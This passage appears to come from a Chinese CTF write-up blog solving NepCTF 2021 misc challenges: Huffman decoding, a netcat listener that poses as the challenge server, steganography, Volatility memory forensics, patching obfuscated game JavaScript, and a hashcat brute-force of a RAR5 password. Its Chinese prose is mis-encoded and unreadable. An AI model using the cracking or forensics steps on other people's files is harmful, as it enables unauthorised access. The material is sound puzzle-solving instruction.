class="string">&#x27;&#125;&#x27;</span>, <span class="number">1</span>)]</span><br><span class="line">    nodes = create_nodes([item[<span class="number">1</span>] <span class="keyword">for</span> item <span class="keyword">in</span> char_frequency])</span><br><span class="line">    root = create_huffman_tree(nodes)</span><br><span class="line">    codes = huffman_encoding(nodes, root)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># huffman_str = encode_str(text, char_frequency, codes)</span></span><br><span class="line">    origin_str = decode_str(huf_text, char_frequency, codes)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print &#x27;Encode result:&#x27; + huffman_str</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Decode result:&#x27;</span> + origin_str</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode result:jz7ezl64pjhgx6iun78roljc01bm72vjr7u44dfh9tewz8auzmzdzypet4d9xcehxspktdcgxgeeybmgva5pp9850b9mceifedlos6rehy8isvpzf6u545y50c4y9avuvqq3g1epi6igd6tciby7hep9o33cm3guo4qvcxqpcg6zdi5i1r6mmj6xcq5ummzm6jiniidbn51kppj15dp3zy4o8pww23kggukjrytosbkx8th00zba777e0kkz9e1te3u5i36fiym3pran1zgp2a192x63mnc35dhocqli21s2qby9htvdp82x9t6ai0n0wkvbl080bj3xzpj5m8a3jn67kh0le8v104lwa155n8n5o7y97ypdw6hv7d6rbkppxb3ktxnhttb29zsehww2u2x0fhb2k2p1uafhwrfgx7vha64xjr2ffewd30n9961ozt8dgdikly8cknf36kbh2chj28xrencflag&#123;5rd477a2-6r36-dra9-9d63-49c2e9e5d1e5&#125;f43x61l9v3de9z0hiwfz30l1keik5vx48m4yrausvae6fq1q7b9yb4s4tzqbbkyy2hizvqg26spral8rkz37cuylk1k0wfy8p4zppjujggcvpv9e0nhfopumxecd4zbo5sc76zpx8kvttaohud4ltdw16vmgfgucfw2nnafkuup4a6sgkxpk4nw0ax65j6w2498qoap2pqf4el1tu79k6jagxq4q7injr6pkz8yroz25ymdv7uq8h3k24mgf63gmld1i1jga7yupef74l95xr11l1yemjscrn313u89ilrpm8cfj8x826igbfmfnw98qdkm8i3z1vj8ajsebab9w9afhaccvd8qsv2u8zcohp6bxkjonpfoio896q01vje9o2jp00snunzj6zandlq7l8hldsct3ha4dawq9lq8t3u34fmkxrmwd8o4tmow3028o1rqcjzkg9mubjwr5byx7hn44o38vd50</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å…¶ä¸­åŒ…å«æœ‰ flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5rd477a2-6r36-dra9-9d63-49c2e9e5d1e5&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>(&#39;r&#39;, 24),(&#39;0&#39;, 24)</code> ä¸¤ä¸ªå­—æ¯çš„è¯é¢‘æ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤å®é™…ä¸Šæœ‰ä¸¤ç§è§£æ³•ï¼Œå‰©ä½™çš„ä¸€ç§å¦‚ä¸‹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;50d477a2-6036-d0a9-9d63-49c2e9e5d1e5&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF 2021</title>
      <link href="/zh-CN/posts/827bc0ca.html"/>
      <url>/zh-CN/posts/827bc0ca.html</url>
      
        <content type="html"><![CDATA[<h3 id="æˆ‘æ˜¯é—´è°2nd"><a href="#æˆ‘æ˜¯é—´è°2nd" class="headerlink" title="æˆ‘æ˜¯é—´è°2nd"></a>æˆ‘æ˜¯é—´è°2nd</h3><blockquote><p>remember: try to forgery ip,but not to reverse it.</p></blockquote><p>æ ¹æ®æç¤ºå¾—çŸ¥éœ€è¦ä¼ªé€  IPï¼Œæ­¤å¤„å› ä¸ºéœ€è¦ç»ˆç«¯äº¤äº’ï¼Œæ‰€ä»¥ä½¿ç”¨ç¯å›é€‚é…å™¨ä¸æ˜¯ä¸ªå¾ˆå¥½çš„æ–¹æ¡ˆã€‚æœ€æ–¹ä¾¿çš„åŠæ³•æ˜¯ç›´æ¥æŠŠç‰©ç†ç½‘å¡å½“å‰è¿æ¥çš„ IPv4 åœ°å€ç›´æ¥æ”¹æˆ 223.223.223.223ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f103c270-2858-4c57-870f-e1631d283880/1616214874795/f303f01690f2350557e593c85898c68c2a76ec58.png"></p><p>æ­¤æ—¶åœ¨æ§åˆ¶å°ä½¿ç”¨ Netcat ç›‘å¬ç¨‹åºéœ€è¦è¿æ¥äº¤äº’çš„ 6001 ç«¯å£ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">nc -lvvp 6001</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨ç¨‹åºå¯è§å¦‚ä¸‹å›æ˜¾ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connecting to 223.223.223.223:6001</span><br><span class="line">send one character of flag to server....</span><br><span class="line">wait for reply from server....</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åœ¨ç›‘å¬å¤„è¾“å…¥ä»»æ„å­—ç¬¦å›è½¦å³å¯æ¥ç»­äº¤äº’ï¼Œå¾€å¤æ‰§è¡Œå¯é€ä½è·å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;XVlBzgbaiCMRAjWwhTHctcuAxhxKQFDaFpLSjFbcXoEF&#125;</span><br></pre></td></tr></table></figure><h3 id="å‡ºé¢˜äººæ—¥è®°"><a href="#å‡ºé¢˜äººæ—¥è®°" class="headerlink" title="å‡ºé¢˜äººæ—¥è®°"></a>å‡ºé¢˜äººæ—¥è®°</h3><p>é™„ä»¶çš„ Excel æ–‡ä»¶ä½¿ç”¨è§£å‹è½¯ä»¶æ‰“å¼€å¯å¾—å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hint:</span><br><span class="line">éšå†™.wf pna fbyir guvf ceboyrz</span><br><span class="line"></span><br><span class="line">[ROT13]</span><br><span class="line">js can solve this problem</span><br></pre></td></tr></table></figure><p>åœ¨ Excel æ–‡ä»¶çš„ <code>xl/media/</code> ä¸‹å¯å‘ç°æ–‡ä»¶æ‹“å±•åè¢«ä¿®æ”¹çš„ <code>fufufufufufufufufuufufufufufufufufufufufufufufufufu.flag</code>ï¼Œä¿®æ­£å…¶æ‹“å±•åä¸º <code>.png</code>ã€‚ä½¿ç”¨ Stegsolve æŸ¥çœ‹å›¾ç‰‡ï¼Œå¯å‘ç°å›¾ç‰‡çš„ Alpha é€šé“ä¸‹å¯èƒ½å­˜æœ‰æ•°æ®ï¼Œä¸” Data Extract æ— æ³•æå–å‡ºæœ‰æ•ˆå†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f103c270-2858-4c57-870f-e1631d283880/1616219266024/c76234c67451f657b60f6494d84abef93fdf7c7f.png"></p><p>ç»“åˆ hint å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹é¡¹ç›®ã€‚æŒ‰ç…§ä½¿ç”¨æ–¹æ³•æ“ä½œå³å¯å¾— flagã€‚</p><blockquote><p>GitHub Repo: <a href="https://github.com/metallurgical/LSB-steganography-javascript">https://github.com/metallurgical/LSB-steganography-javascript</a></p></blockquote><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f103c270-2858-4c57-870f-e1631d283880/1616219433496/c9bca5fdce587ff1ea7a8777ee201451d2f5136b.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;D4La0_s0lve_th1s_probl3m_to_hit_c4ij1&#125;</span><br></pre></td></tr></table></figure><h3 id="æˆ‘æ²¡æœ‰py"><a href="#æˆ‘æ²¡æœ‰py" class="headerlink" title="æˆ‘æ²¡æœ‰py"></a>æˆ‘æ²¡æœ‰py</h3><h4 id="å†…å­˜å–è¯è·å¾—å¯†ç "><a href="#å†…å­˜å–è¯è·å¾—å¯†ç " class="headerlink" title="å†…å­˜å–è¯è·å¾—å¯†ç "></a>å†…å­˜å–è¯è·å¾—å¯†ç </h4><p>volatility2 è·‘ imageinfoï¼Œå¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class="line">                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (&#x2F;mnt&#x2F;f&#x2F;ghrepos&#x2F;volatility2&#x2F;WIN-MREMF575OV9-20210317-081823.raw)</span><br><span class="line">                      PAE type : No PAE</span><br><span class="line">                           DTB : 0x187000L</span><br><span class="line">                          KDBG : 0xf800040410a0L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR for CPU 0 : 0xfffff80004042d00L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image date and time : 2021-03-17 08:18:25 UTC+0000</span><br><span class="line">     Image local date and time : 2021-03-17 16:18:25 +0800</span><br></pre></td></tr></table></figure><p>å† filescan å¯ä»¥æ‰¾å‡ºå¦‚ä¸‹é‡ç‚¹å†…å®¹ï¼ŒåŒæ—¶å…³æ³¨åˆ°æ–‡ä»¶ä¸­åŒ…å«å¾®ä¿¡çš„æ–‡ä»¶ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000007fb79730     16      0 RW-r-- \Device\HarddiskVolume1\Users\rr\Desktop\å¯†ç .txt</span><br></pre></td></tr></table></figure><p>å°†è¿™ä¸ªæ–‡ä»¶ä½¿ç”¨ dumpfiles æå–å‡ºæ¥å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I_didn&#39;t_py</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ VeraCrypt é…åˆå¾—åˆ°çš„å¯†ç æŒ‚è½½é™„ä»¶ä¸­æ‰€ç»™çš„è™šæ‹Ÿç£ç›˜ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä»½å®Œæ•´çš„å¾®ä¿¡å¸å·æ–‡ä»¶ã€‚</p><h4 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h4><p>å†™ç€å†™ç€å¬è¯´å‡ºäº†éé¢„æœŸï¼Œæƒ³åˆ°äº†ä¹‹å‰çš„ Ant X D3CTF çš„ VMware çš„éé¢„æœŸã€‚ç¨å¾®æœç´¢äº†ä¸€ä¸‹ï¼ŒçœŸçš„èƒ½æœåˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;sharun_Aka_xiaokeaiï¼&#125;</span><br></pre></td></tr></table></figure><h3 id="å†°å³°å†é™©è®°"><a href="#å†°å³°å†é™©è®°" class="headerlink" title="å†°å³°å†é™©è®°"></a>å†°å³°å†é™©è®°</h3><p>å¯åŠ¨æ¸¸æˆå¯ä»¥å‘ç°å…¶å›¾æ ‡æ˜¯ Electron çš„å›¾æ ‡ï¼Œä½¿ç”¨ <code>Ctrl + Shift + I</code> å¯ä»¥å”¤å‡ºå¼€å‘è€…å·¥å…·ã€‚åœ¨ Console ä¸‹å¯ä»¥çœ‹åˆ°ä¸€ä¸ªè­¦å‘Šï¼Œå…¶ä¸­åŒ…å«äº†æ¸¸æˆèµ„æºé‡Šæ”¾çš„è·¯å¾„ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f103c270-2858-4c57-870f-e1631d283880/1616244869689/84375cd9f4f55be56607602c34d1da106b6d53bb.png"> </p><p>å®šå‘åˆ°ç›¸å…³çš„ç›®å½•å¯ä»¥çœ‹åˆ°è¿™ä¸ª Electron ç¨‹åºçš„ç»“æ„ã€‚å¯ä»¥å‘ç°å…¶ä¸»è¦æ˜¯ä½¿ç”¨ JS é©±åŠ¨çš„ï¼Œäºæ˜¯å°è¯•åœ¨æ§åˆ¶å°å°è¯•ç›¸å…³å…³é”®å­—ã€‚æ‰§è¡Œ <code>win()</code> å‡½æ•°åå¯ä»¥å‘ç°æ¸¸æˆç”»é¢ç›´æ¥è·³è½¬åˆ°äº†ç»“æŸå¹¶è¦æ±‚è¾“å…¥å¯†ç è§£é”ç®±å­çš„ç”»é¢ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f103c270-2858-4c57-870f-e1631d283880/1616245077825/1829b12449ef32c34203ef253ef5f5be08d65692.png"></p><p>æ­¤æ—¶åœ¨é¡µé¢å¯ä»¥æ‰¾åˆ°ä¸€æ®µå†…è” JSï¼Œç¨åŠ æ•´ç†åå¾—åˆ°å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onButtonClick</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> _0x3771 = [</span><br><span class="line"><span class="string">&#x27;ble&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ratu&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;39F2&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1LIJveh&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;23nyOSum&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;16MBsizm&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;4dMPsHS&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;-1DE&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;73294VUMRxR&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;4AE1&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;1161887UPGDlh&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;3609&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;font&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;8DC3&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Size&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;6D6-&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Cong&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;23kcMzKe&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;E558&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;156525dPfREI&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;styl&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;lati&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;5cBLINZ&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;55739hrmAsl&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Nep&#123;&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;68858hnUPCt&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;109961hCoEny&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;visi&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;ons!&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;46051FfapOI&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;text&#x27;</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> _0x336e = <span class="function"><span class="keyword">function</span> (<span class="params">_0x8710fc, _0xbfc9ff</span>) </span>&#123;</span><br><span class="line">_0x8710fc = _0x8710fc - <span class="number">169</span>;</span><br><span class="line"><span class="keyword">var</span> _0x377162 = _0x3771[_0x8710fc];</span><br><span class="line"><span class="keyword">return</span> _0x377162;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> _0x422051 = _0x336e;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">_0x5ea0a5, _0x23a2f6</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> _0x4b1718 = _0x336e;</span><br><span class="line"><span class="keyword">while</span> (!![]) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> _0x13718d = <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">179</span>)) * -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">187</span>)) + -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">185</span>)) * <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">196</span>)) + -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">172</span>)) + -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">199</span>)) * -<span class="built_in">parseInt</span>(_0x4b1718(<span class="number">188</span>)) + <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">170</span>)) * <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">197</span>)) + <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">191</span>)) * <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">198</span>)) + <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">181</span>)) * <span class="built_in">parseInt</span>(_0x4b1718(<span class="number">184</span>));</span><br><span class="line"><span class="keyword">if</span> (_0x13718d === _0x23a2f6)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">_0x5ea0a5[<span class="string">&#x27;push&#x27;</span>](_0x5ea0a5[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">&#125; <span class="keyword">catch</span> (_0x2f82a9) &#123;</span><br><span class="line">_0x5ea0a5[<span class="string">&#x27;push&#x27;</span>](_0x5ea0a5[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;(_0x3771, <span class="number">843687</span>));</span><br><span class="line"><span class="keyword">if</span> (input[_0x422051(<span class="number">192</span>)] == _0x422051(<span class="number">186</span>) + _0x422051(<span class="number">195</span>) + _0x422051(<span class="number">171</span>) + _0x422051(<span class="number">169</span>) + <span class="string">&#x27;B-49&#x27;</span> + <span class="string">&#x27;31-A&#x27;</span> + _0x422051(<span class="number">177</span>) + _0x422051(<span class="number">173</span>) + _0x422051(<span class="number">175</span>) + _0x422051(<span class="number">180</span>) + <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">chest_lock[_0x422051(<span class="number">189</span>) + <span class="string">&#x27;ble&#x27;</span>] = !![], chest_unlock[_0x422051(<span class="number">189</span>) + <span class="string">&#x27;ble&#x27;</span>] = ![], input[_0x422051(<span class="number">189</span>) + <span class="string">&#x27;ble&#x27;</span>] = ![], balloon[<span class="string">&#x27;visi&#x27;</span> + <span class="string">&#x27;ble&#x27;</span>] = ![], dialog[_0x422051(<span class="number">192</span>)] = _0x422051(<span class="number">178</span>) + _0x422051(<span class="number">194</span>) + _0x422051(<span class="number">183</span>) + _0x422051(<span class="number">190</span>), dialog[_0x422051(<span class="number">182</span>) + <span class="string">&#x27;e&#x27;</span>][_0x422051(<span class="number">174</span>) + _0x422051(<span class="number">176</span>)] = <span class="number">64</span>, dialog[<span class="string">&#x27;x&#x27;</span>] = <span class="number">10</span>, dialog[<span class="string">&#x27;y&#x27;</span>] = <span class="number">50</span>, <span class="built_in">this</span>[_0x422051(<span class="number">189</span>) + _0x422051(<span class="number">193</span>)] = ![];</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">timeoutid != <span class="literal">null</span> &amp;&amp; <span class="built_in">clearTimeout</span>(timeoutid);</span><br><span class="line">prompts[_0x422051(<span class="number">189</span>) + _0x422051(<span class="number">193</span>)] = !![], balloon[_0x422051(<span class="number">189</span>) + _0x422051(<span class="number">193</span>)] = !![], timeoutid = <span class="built_in">setTimeout</span>(disappear, <span class="number">5000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³é”®å°±åœ¨äº <code>if (input[_0x422051(192)] == _0x422051(186) + _0x422051(195) + _0x422051(171) + _0x422051(169) + &#39;B-49&#39; + &#39;31-A&#39; + _0x422051(177) + _0x422051(173) + _0x422051(175) + _0x422051(180) + &#39;&#125;&#39;) </code>ã€‚å°† <code>==</code> æ”¹ä½œ <code>!=</code> æ—¶å¯ä»¥å¾—åˆ° Congratulations!</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f103c270-2858-4c57-870f-e1631d283880/1616251624202/f25391dc5457e60d82e94809267ca6e0a71a1c31.png"></p><p>æ ¹æ®ä¸Šä¸€ä¸ªç”»é¢å¯æ¨çŸ¥éœ€è¦è¾“å…¥çš„æ­£æ˜¯ flagï¼Œå› æ­¤æ­¤å¤„çš„åˆ¤æ–­æ‹¼æ¥åˆ¤æ–­çš„ä¹Ÿæ˜¯ flagï¼Œæ‰€ä»¥ä¿®æ”¹åˆ¤æ–­é€»è¾‘ååŠ ä¸€å¥ä»£ç å°†å…¶æ‹¼æ¥çš„å†…å®¹è¾“å‡ºã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(_0x422051(<span class="number">186</span>) + _0x422051(<span class="number">195</span>) + _0x422051(<span class="number">171</span>) + _0x422051(<span class="number">169</span>) + <span class="string">&#x27;B-49&#x27;</span> + <span class="string">&#x27;31-A&#x27;</span> + _0x422051(<span class="number">177</span>) + _0x422051(<span class="number">173</span>) + _0x422051(<span class="number">175</span>) + _0x422051(<span class="number">180</span>) + <span class="string">&#x27;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>å°†ä»£ç å†™åœ¨ <code>if</code> çš„é€»è¾‘å†…ï¼Œå°†é€»è¾‘å–ååå†æ¬¡è§¦å‘ <code>onButtonClick()</code> å‡½æ•°å³å¯åœ¨æ§åˆ¶å°å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;39F24AE1-1DEB-4931-A6D6-36098DC3E558&#125;</span><br></pre></td></tr></table></figure><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>å°è¯•æŠŠç»™å‡ºçš„å†…å®¹æ”¾åˆ° Sublime Text é‡Œæ•´ç†ä¸€ä¸‹ï¼Œç”¨ CyberChef æŠŠ <code>f</code> æ›¿æ¢æˆç©ºæ ¼ï¼Œå†ç”¨ mspaint ç¨ä½œå¤„ç†å¯ä»¥å¾—åˆ°ä¸‹å›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f103c270-2858-4c57-870f-e1631d283880/1616256494781/f49d80c7b453075797bbf487ea25a192496bdbf0.png"></p><p>ç»“åˆç¨å¾®çš„çŒœæµ‹ï¼Œå¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nep&#123;Y0u_ar3_50_cl3ver!&#125;</span><br></pre></td></tr></table></figure><h3 id="make-hsy-great-again"><a href="#make-hsy-great-again" class="headerlink" title="make_hsy_great_again"></a>make_hsy_great_again</h3><p>010 editor æ‰“å¼€æ–‡ä»¶å‘ç°æœ«å°¾æœ‰æç¤º <code>six</code>ï¼ŒçŒœæµ‹å‹ç¼©åŒ…å¯†ç æ˜¯å…­ä½æ•°å­—ã€‚rar2john é¦–å…ˆç®—å‡ºå‹ç¼©åŒ…çš„ hash å€¼å¦‚ä¸‹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2</span><br></pre></td></tr></table></figure><p>å› ä¸ºå‹ç¼©åŒ…å‹ç¼©æ–¹å¼æ˜¯ RAR50ï¼Œå› æ­¤ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤çˆ†ç ´å‹ç¼©åŒ…å¯†ç ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat64.exe -m 13000 -a 3 &#39;$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2&#39; ?d?d?d?d?d?d</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœï¼Œå› æ­¤å‹ç¼©åŒ…å¯†ç æ˜¯ 520233ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rar5$16$fe5656ec27f0754cb92ca0a79120e099$15$974a98d46f1d4da877c271091ea930e9$8$48f568d6888772c2:520233</span><br></pre></td></tr></table></figure><p>å°†é™„ä»¶è§£å‹å¯å¾—ä¸€å¼ å›¾ç‰‡ï¼Œä½¿ç”¨ 010 editor æ‰“å¼€å¯å‘ç°å…¶å°¾éƒ¨æœ‰å€’è¿‡æ¥çš„ PNG å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f103c270-2858-4c57-870f-e1631d283880/1616258597840/15bb540d6e5e6f3fa59a03b82b66e4347d1754fe.png"></p><p>å°†å…¶æå–å‡ºæ¥å¹¶ Reverse ä¸€æ¬¡å¯å¾—åˆ°æ­£å¸¸çš„ä¸€å¼  PNG å›¾ç‰‡ã€‚ä½¿ç”¨ Stegsolve å¯è§£å‡ºå¦‚ä¸‹å›¾ç‰‡ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/f103c270-2858-4c57-870f-e1631d283880/1616260624467/4ee4b70cfc08bce4f182d861c538404d0da37770.png@250h.png"></p><p>åŒæ—¶å¯ä»¥å‘ç°å›¾ç‰‡çš„å³ä¸Šè§’æœ‰ç±»ä¼¼ LSB éšå†™çš„å°ç‚¹ç‚¹ã€‚å°†å›¾ç‰‡é€†æ—¶é’ˆæ—‹è½¬ $90^\circ$ åæå– Alpha 3/2/1/0 å‡ ä¸ªé€šé“çš„æ•°æ®å¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 